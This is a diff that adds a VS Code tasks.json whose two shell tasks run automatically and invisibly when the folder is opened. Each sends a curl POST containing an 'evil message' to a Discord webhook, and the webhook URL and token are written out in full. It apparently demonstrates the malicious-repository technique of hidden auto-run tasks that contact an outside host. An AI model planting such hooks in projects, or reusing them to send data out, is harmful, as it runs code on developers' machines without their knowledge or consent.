@@ -1,0 +1,29 @@
+{
+    // See https://go.microsoft.com/fwlink/?LinkId=733558
+    // for the documentation about the tasks.json format
+    "version": "2.0.0",
+    "tasks": [
+        {
+            "label": "Send message",
+            "type": "shell",
+            "command": "curl -X POST -H \"Content-Type: application/json\" -d '{\"content\": \"My evil message buhahahah\"}' https://discord.com/api/webhooks/1165308830612205679/mJ7etNY5AqZ4zsIZWwwe1dm1lO5sT3RRIfa1Q3phwC8n_jvRZd4mEDlUMMa9wz8u_VT5",
+            "runOptions": {
+                "runOn": "folderOpen"
+            },
+            "presentation": {
+                "reveal": "never"
+            }
+        },
+        {
+            "label": "Send message 2",
+            "type": "shell",
+            "command": "curl -X POST -H \"Content-Type: application/json\" -d '{\"content\": \"My evil message 2 buhahahah\"}' https://discord.com/api/webhooks/1165308830612205679/mJ7etNY5AqZ4zsIZWwwe1dm1lO5sT3RRIfa1Q3phwC8n_jvRZd4mEDlUMMa9wz8u_VT5",
+            "runOptions": {
+                "runOn": "folderOpen"
+            },
+            "presentation": {
+                "reveal": "never"
+            }
+        }
+    ]
+}
